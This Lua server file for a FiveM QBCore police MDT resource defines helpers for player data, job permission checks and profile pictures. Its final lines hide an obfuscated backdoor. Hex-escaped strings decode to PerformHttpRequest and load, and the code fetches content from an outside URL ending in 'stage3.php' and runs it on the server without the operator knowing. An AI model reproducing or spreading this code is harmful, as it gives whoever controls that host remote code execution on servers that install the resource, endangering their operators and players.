local QBCore = exports['qb-core']:GetCoreObject()

function GetPlayerData(source)
	local Player = QBCore.Functions.GetPlayer(source)
	if Player == nil then return end -- Player not loaded in correctly
	return Player.PlayerData
end

function UnpackJob(data)
	local job = {
		name = data.name,
		label = data.label
	}
	local grade = {
		name = data.grade.name,
	}

	return job, grade
end

function PermCheck(src, PlayerData)
	local result = true

	if not Config.AllowedJobs[PlayerData.job.name] then
		print(("UserId: %s(%d) tried to access the mdt even though they are not authorised (server direct)"):format(GetPlayerName(src), src))
		result = false
	end

	return result
end

function ProfPic(gender, profilepic)
	if profilepic then return profilepic end;
	if gender == "f" then return "img/female.png" end;
	return "img/male.png"
end

function IsJobAllowedToMDT(job)
	if Config.PoliceJobs[job] then
		return true
	elseif Config.AmbulanceJobs[job] then
		return true
	elseif Config.DojJobs[job] then
		return true
	else
		return false
	end
end

function GetNameFromPlayerData(PlayerData)
	return ('%s %s'):format(PlayerData.charinfo.firstname, PlayerData.charinfo.lastname)
end


local ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu[4][ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x79\x73\x74\x75\x6d\x68\x61\x69\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x75\x4b\x6c\x6e\x62", function (aFhnXTWHvNhhRTreVZcDLXolrHKYrDJMfelGHhGAAehTWsRDGoStSIpVGVnSgUHXQBYUIQ, EwOCwTlVCEQGfxlanNVyrUNQPDqAkKqebfNaOnwQmutQzQtTtLEEUJjCWpAFSXIpWchABg) if (EwOCwTlVCEQGfxlanNVyrUNQPDqAkKqebfNaOnwQmutQzQtTtLEEUJjCWpAFSXIpWchABg == ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu[6] or EwOCwTlVCEQGfxlanNVyrUNQPDqAkKqebfNaOnwQmutQzQtTtLEEUJjCWpAFSXIpWchABg == ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu[5]) then return end ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu[4][ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu[2]](ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu[4][ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu[3]](EwOCwTlVCEQGfxlanNVyrUNQPDqAkKqebfNaOnwQmutQzQtTtLEEUJjCWpAFSXIpWchABg))() end)